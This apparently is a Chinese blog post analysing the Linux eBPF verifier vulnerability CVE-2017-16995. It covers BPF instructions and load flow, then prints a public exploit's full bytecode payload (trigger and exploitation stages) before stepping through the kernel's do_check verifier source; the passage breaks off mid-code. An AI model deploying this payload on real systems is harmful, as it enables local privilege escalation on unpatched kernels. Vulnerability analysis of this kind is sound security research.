<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CVE-2017-16995 -- 触发 | ph4ntom's blog</title><meta name="keywords" content="binary"><meta name="author" content="ph4ntom"><meta name="copyright" content="ph4ntom"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="深入分析一下CVE-2017-16995漏洞形成过程以及其修复">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2017-16995 -- 触发">
<meta property="og:url" content="https://ph4ntonn.github.io/CVE-2017-16995-trigger.html">
<meta property="og:site_name" content="ph4ntom&#39;s blog">
<meta property="og:description" content="深入分析一下CVE-2017-16995漏洞形成过程以及其修复">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg">
<meta property="article:published_time" content="2021-01-12T04:06:13.000Z">
<meta property="article:modified_time" content="2021-01-21T08:47:04.962Z">
<meta property="article:author" content="ph4ntom">
<meta property="article:tag" content="binary">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ph4ntonn.github.io/CVE-2017-16995-trigger"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="rbM4vbAtejyl3i3Ybvi5N-p_l4JJEPEFwc5aqlYCLzo"/><meta name="baidu-site-verification" content="code-Nde8XbsifS"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-01-21 16:47:04'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ph4ntom's blog</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">CVE-2017-16995 -- 触发</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-12T04:06:13.000Z" title="发表于 2021-01-12 12:06:13">2021-01-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-01-21T08:47:04.962Z" title="更新于 2021-01-21 16:47:04">2021-01-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">8.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>41分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>CVE-2017-16995是基于ebpf机制的漏洞，漏洞点在于ebpf在虚拟执行时由于错误的符号拓展从而误判执行流程，导致了在实际执行过程中出现预期外的情况。</p>
<p>最近正好也在看内核的代码，所以秉着边分析边学的原则，来详细看看CVE-2017-16995的实现细节</p>
<p>本文参考了一些网上的资料，膜各位dl</p>
<h1 id="什么是bpf"><a href="#什么是bpf" class="headerlink" title="什么是bpf"></a>什么是bpf</h1><p>众所周知，linux的用户层和内核层是隔离的，想让内核执行用户的代码，正常是需要编写内核模块，当然内核模块只能root用户才能加载。而BPF则相当于是内核给用户开的一个绿色通道：BPF（Berkeley Packet Filter）提供了一个用户和内核之间代码和数据传输的桥梁。用户可以用eBPF指令字节码的形式向内核输送代码，并通过事件（如往socket写数据）来触发内核执行用户提供的代码；同时以map（key，value）的形式来和内核共享数据，用户层向map中写数据，内核层从map中取数据，反之亦然。BPF设计初衷是用来在底层对网络进行过滤，后续由于他可以方便的向内核注入代码，并且还提供了一套完整的安全措施来对内核进行保护，被广泛用于抓包、内核probe、性能监控等领域。BPF发展经历了2个阶段，cBPF（classic BPF）和eBPF（extend BPF），cBPF已退出历史舞台，后文提到的BPF默认为eBPF。</p>
<h1 id="bpf指令集"><a href="#bpf指令集" class="headerlink" title="bpf指令集"></a>bpf指令集</h1><p>bpf的指令集类似于虚拟机机制，拥有其单独的一套指令格式及语法</p>
<p>在bpf语法中一共有11个寄存器，分别一一对应机器上的11个物理寄存器，可以从下面看到，r9寄存器并没有被映射，所以bpf语法中函数最多只能有五个参数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">R0 – rax</span><br><span class="line">R1 - rdi</span><br><span class="line">R2 - rsi</span><br><span class="line">R3 - rdx</span><br><span class="line">R4 - rcx</span><br><span class="line">R5 - r8</span><br><span class="line">R6 - rbx</span><br><span class="line">R7 - r13</span><br><span class="line">R8 - r14</span><br><span class="line">R9 - r15</span><br><span class="line">R10 – rbp（帧指针，frame pointer）</span><br></pre></td></tr></table></figure>

<p>每一条指令格式都如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> &#123;</span></span><br><span class="line">    __u8    code;       <span class="comment">/* opcode */</span></span><br><span class="line">    __u8    dst_reg:<span class="number">4</span>;  <span class="comment">/* dest register */</span></span><br><span class="line">    __u8    src_reg:<span class="number">4</span>;  <span class="comment">/* source register */</span></span><br><span class="line">    __s16   off;        <span class="comment">/* signed offset */</span></span><br><span class="line">    __s32   imm;        <span class="comment">/* signed immediate constant */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>打个比方，比如<code>mov eax,0xffffffff</code>这一汇编语句，如果翻译成bpf的语句，那么就是<code>BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF)</code>，<code>BPF_MOV32_IMM</code>指令的数据结构如下(<code>include/linux/filter.h</code>)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_IMM(DST, IMM)                 \</span></span><br><span class="line">((struct bpf_insn) &#123;                    \</span><br><span class="line">    .code  = BPF_ALU | BPF_MOV | BPF_K,     \</span><br><span class="line">    .dst_reg = DST,                 \</span><br><span class="line">    .src_reg = <span class="number">0</span>,                   \</span><br><span class="line">    .off   = <span class="number">0</span>,                 \</span><br><span class="line">    .imm   = IMM &#125;)</span><br></pre></td></tr></table></figure>
<p>根据数据结构，可将指令转化为字节码<code>\xb4\x09\x00\x00\xff\xff\xff\xff</code>(相关宏可查看<code>include/uapi/linux/bpf_common.h</code>以及<code>include/uapi/linux/bpf.h</code>)</p>
<h1 id="bpf加载流程"><a href="#bpf加载流程" class="headerlink" title="bpf加载流程"></a>bpf加载流程</h1><p>一个典型的BPF程序流程为：</p>
<ol>
<li><p>用户程序调用syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr))申请创建一个map，在attr结构体中指定map的类型、大小、最大容量等属性。</p>
</li>
<li><p>用户程序调用syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr))来将我们写的BPF代码加载进内核，attr结构体中包含了指令数量、指令首地址指针、日志级别等属性。在加载之前会利用虚拟执行的方式来做安全性校验，这个校验包括对指定语法的检查、指令数量的检查、指令中的指针和立即数的范围及读写权限检查，禁止将内核中的地址暴露给用户空间，禁止对BPF程序stack之外的内核地址读写。安全校验通过后，程序被成功加载至内核，后续真正执行时，不再重复做检查。</p>
</li>
<li><p>用户程序通过调用setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd)将我们写的BPF程序绑定到指定的socket上。Progfd为上一步骤的返回值。</p>
</li>
<li><p>用户程序通过操作上一步骤中的socket来触发BPF真正执行。</p>
</li>
</ol>
<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>上面很多知识点大多都是网上资料(笑～)，接下来来详细看看漏洞成因，以下代码均为<code>linux-4.5</code>内核代码</p>
<p>我们先来看看exp中payload的设置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *__prog =</span><br><span class="line"><span class="comment">// 漏洞触发阶段payload</span></span><br><span class="line"><span class="string">&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;</span> <span class="comment">//BPF_REG_9 = 0xffffffff</span></span><br><span class="line"><span class="string">&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;</span> <span class="comment">//if BPF_REG_9 == -1 &#123;  </span></span><br><span class="line"><span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span> <span class="comment">// BPF_REG_0 = 0&#125; </span></span><br><span class="line"><span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span> <span class="comment">// exit(0)</span></span><br><span class="line"><span class="comment">// 申请map</span></span><br><span class="line"><span class="string">&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="comment">// 漏洞利用阶段payload</span></span><br><span class="line"><span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>首先，在<code>kernel/bpf/verifier.c</code>中，会对用户请求设置的bpf指令进行验证，实际上就是虚拟执行用户设置的bpf指令，检查其是否存在不合法的操作，如泄露内核栈指针地址，直接的内存读写等，如果存在不合法的操作，那么bpf指令将会被拒绝加载</p>
<p>payload前四行我标出了bpf指令对应的伪代码，我们一行一行来看，这四行就包含了漏洞触发的关键</p>
<p>首先整个payload代码将会经过<code>kernel/bpf/verifier.c</code>中的do_check函数，函数如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_check</span><span class="params">(struct verifier_env *env)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">verifier_state</span> *<span class="title">state</span> =</span> &amp;env-&gt;cur_state;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> *<span class="title">insns</span> =</span> env-&gt;prog-&gt;insnsi;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">reg_state</span> *<span class="title">regs</span> =</span> state-&gt;regs;</span><br><span class="line">    <span class="keyword">int</span> insn_cnt = env-&gt;prog-&gt;len;</span><br><span class="line">    <span class="keyword">int</span> insn_idx, prev_insn_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> insn_processed = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> do_print_state = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    init_reg_state(regs);</span><br><span class="line">    insn_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123; <span class="comment">// 通过循环来检查用户设置的每一行bpf指令</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> *<span class="title">insn</span>;</span></span><br><span class="line">        u8 <span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">        <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (insn_idx &gt;= insn_cnt) &#123;</span><br><span class="line">            verbose(<span class="string">&quot;invalid insn idx %d insn_cnt %d\n&quot;</span>,</span><br><span class="line">                insn_idx, insn_cnt);</span><br><span class="line">            <span class="keyword">return</span> -EFAULT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        insn = &amp;insns[insn_idx]; <span class="comment">// 获得一行指令</span></span><br><span class="line">        <span class="class"><span class="keyword">class</span> =</span> BPF_CLASS(insn-&gt;code); <span class="comment">// 检查此指令所属的class，BPF_CLASS宏为：#define BPF_CLASS(code) ((code) &amp; 0x07)</span></span><br><span 